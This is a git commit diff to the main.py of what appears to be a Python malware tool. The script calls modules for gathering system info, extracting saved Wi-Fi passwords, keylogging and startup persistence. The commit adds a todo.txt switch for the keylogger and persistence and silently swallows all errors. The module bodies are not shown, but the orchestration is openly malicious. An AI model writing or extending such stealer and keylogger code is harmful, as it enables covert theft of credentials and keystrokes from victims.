25895c837cc2beaff426baadf0bb184c653cad01
Josakko <112590914+Josakko@users.noreply.github.com>
2023-04-26 18:00:00 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,16 +1,45 @@
-from modules.info import save
+from modules.info import run
 from modules.wifi import WifiPasswords
 from modules.keylogger import Keylogger
 from modules.startup import StartUp
 
 
-save()
+try:
+    with open("todo.txt", "r") as f:
+        lines = f.readlines()
+        keylogger = lines[4]
+        Startup = lines[5].strip()
+        print(Startup)
+        f.close()
+except:
+    Startup = "null"
+    keylogger = "null"
 
-wifi = WifiPasswords()
-wifi.run()
 
-Logger = Keylogger()
-Logger.run()
+try:
+    run()
+except:
+    pass
 
-startup = StartUp()
-startup.run()
+
+try:
+    wifi = WifiPasswords()
+    wifi.run()
+except:
+    pass
+
+if Startup == "True":
+    print("startup")
+    try:
+        startup = StartUp()
+        startup.run()
+    except Exception as e:
+        pass
+
+
+if keylogger == "True":
+    try:
+        keyLogger = Keylogger()
+        keyLogger.run()
+    except:
+        pass
